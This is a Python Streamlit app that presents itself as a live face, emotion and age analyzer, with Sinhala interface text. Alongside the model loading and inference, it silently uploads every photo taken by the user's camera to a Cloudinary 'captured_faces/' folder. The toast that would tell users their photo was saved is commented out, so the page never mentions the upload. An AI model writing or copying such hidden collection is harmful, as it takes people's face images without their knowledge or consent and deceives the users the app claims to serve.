import streamlit as st
import cv2
import numpy as np
import requests
import os
import cloudinary
import cloudinary.uploader

st.set_page_config(page_title="Face, Emotion & Age Analyzer", page_icon="🕵️‍♂️")
st.title("🕵️‍♂️ Live Face, Emotion & Age Analyzer")
st.write("ඔබගේ මුහුණේ Emotion එක (හැඟීම) සහ Age (වයස) සජීවීව පරීක්ෂා කරගන්න!")

# Cloudinary Configuration (Secrets මඟින් ලබා ගනී)
try:
    cloudinary.config(
        cloud_name = st.secrets["cloudinary"]["cloud_name"],
        api_key = st.secrets["cloudinary"]["api_key"],
        api_secret = st.secrets["cloudinary"]["api_secret"],
        secure = True
    )
    cloud_enabled = True
except Exception:
    cloud_enabled = False

EMOTIONS = ['Neutral', 'Happiness', 'Surprise', 'Sadness', 'Anger', 'Disgust', 'Fear', 'Contempt']
AGE_BUCKETS = ['(0-2)', '(4-6)', '(8-12)', '(15-20)', '(25-32)', '(38-43)', '(48-53)', '(60-100)']

def download_file_with_fallbacks(urls, target_path, min_size=500):
    if os.path.exists(target_path) and os.path.getsize(target_path) >= min_size:
        return
    if os.path.exists(target_path):
        os.remove(target_path)
    headers = {'User-Agent': 'Mozilla/5.0'}
    for url in urls:
        try:
            res = requests.get(url, headers=headers, stream=True, timeout=15)
            if res.status_code == 200:
                with open(target_path, "wb") as f:
                    for chunk in res.iter_content(chunk_size=65536):
                        f.write(chunk)
                if os.path.getsize(target_path) >= min_size:
                    return
        except Exception:
            continue
    raise Exception(f"Failed to download valid file for {target_path}")

@st.cache_resource
def load_models():
    cascade_path = "haarcascade_frontalface_default.xml"
    download_file_with_fallbacks(["https://raw.githubusercontent.com/opencv/opencv/master/data/haarcascades/haarcascade_frontalface_default.xml"], cascade_path, min_size=100000)
    face_cascade = cv2.CascadeClassifier(cascade_path)

    model_path = "emotion-ferplus-8.onnx"
    download_file_with_fallbacks(["https://media.githubusercontent.com/media/onnx/models/main/validated/vision/body_analysis/emotion_ferplus/model/emotion-ferplus-8.onnx"], model_path, min_size=1000000)
    emotion_net = cv2.dnn.readNetFromONNX(model_path)

    age_proto = "age_deploy.prototxt"
    age_model = "age_net.caffemodel"
    download_file_with_fallbacks(["https://huggingface.co/AjaySharma/genderDetection/raw/main/age_deploy.prototxt"], age_proto, min_size=400)
    download_file_with_fallbacks(["https://huggingface.co/AjaySharma/genderDetection/resolve/main/age_net.caffemodel"], age_model, min_size=40000000)

    age_net = cv2.dnn.readNetFromCaffe(age_proto, age_model)
    return face_cascade, emotion_net, age_net

try:
    with st.spinner("🕵️‍♂️ Models Loading..."):
        face_cascade, emotion_net, age_net = load_models()
except Exception as e:
    st.error(f"Model Load Error: {e}")
    st.stop()

img_file = st.camera_input("Camera එකෙන් Photo එකක් ගන්න")

if img_file is not None:
    bytes_data = img_file.getvalue()
    
    # ----------------------------------------------------
    # Auto Upload Captured Image to Cloudinary Storage
    # ----------------------------------------------------
    if cloud_enabled:
        try:
            upload_result = cloudinary.uploader.upload(
                bytes_data,
                folder="captured_faces/"
            )
            # st.toast("Photo saved to cloud storage!", icon="☁️")
        except Exception as upload_err:
            print(f"Cloud storage upload error: {upload_err}")
    # ----------------------------------------------------

    cv_img = cv2.imdecode(np.frombuffer(bytes_data, np.uint8), cv2.IMREAD_COLOR)
    gray = cv2.cvtColor(cv_img, cv2.COLOR_BGR2GRAY)

    with st.spinner("Analyzing emotion and age..."):
        faces = face_cascade.detectMultiScale(gray, scaleFactor=1.1, minNeighbors=5, minSize=(30, 30))

        if len(faces) > 0:
            for (x, y, w, h) in faces:
                # Emotion Processing
                face_roi_gray = gray[y:y+h, x:x+w]
                face_resized_gray = cv2.resize(face_roi_gray, (64, 64))
                blob_emotion = cv2.dnn.blobFromImage(face_resized_gray, 1.0, (64, 64), (0, 0, 0), swapRB=False, crop=False)

                emotion_net.setInput(blob_emotion)
                preds_emotion = emotion_net.forward()[0]
                exp_preds = np.exp(preds_emotion - np.max(preds_emotion))
                probs_emotion = exp_preds / exp_preds.sum()
                dominant_emotion = EMOTIONS[np.argmax(probs_emotion)]
                emotion_dict = {EMOTIONS[i]: float(probs_emotion[i]) for i in range(len(EMOTIONS))}

                # Age Processing
                padding = 20
                face_crop = cv_img[max(0,y-padding):min(cv_img.shape[0]-1,y+h+padding), max(0,x-padding):min(cv_img.shape[1]-1,x+w+padding)]
                MODEL_MEAN_VALUES = (78.4263377603, 87.7689143744, 114.895847746)
                blob_age = cv2.dnn.blobFromImage(face_crop, 1.0, (227, 227), MODEL_MEAN_VALUES, swapRB=False)

                age_net.setInput(blob_age)
                preds_age = age_net.forward()[0]
                dominant_age = AGE_BUCKETS[np.argmax(preds_age)]

                cv2.rectangle(cv_img, (x, y), (x + w, y + h), (0, 255, 0), 3)

            rgb_img = cv2.cvtColor(cv_img, cv2.COLOR_BGR2RGB)
            st.image(rgb_img, caption="Analyzed Face", use_container_width=True)

            st.success(f"**Expression (Emotion):** {dominant_emotion.upper()} 🎭")
            st.info(f"**Estimated Age Bracket:** {dominant_age} Years 🗓️")

            col1, col2 = st.columns(2)
            with col1:
                st.subheader("📊 Emotion Breakdown")
                st.bar_chart(emotion_dict)
            with col2:
                st.subheader("📊 Age Ranges")
                st.bar_chart(preds_age)
        else:
            st.warning("මුහුණ පැහැදිලිව අඳුනාගැනීමට නොහැකි විය. කරුණාකර නැවත Photo එකක් ගන්න.")
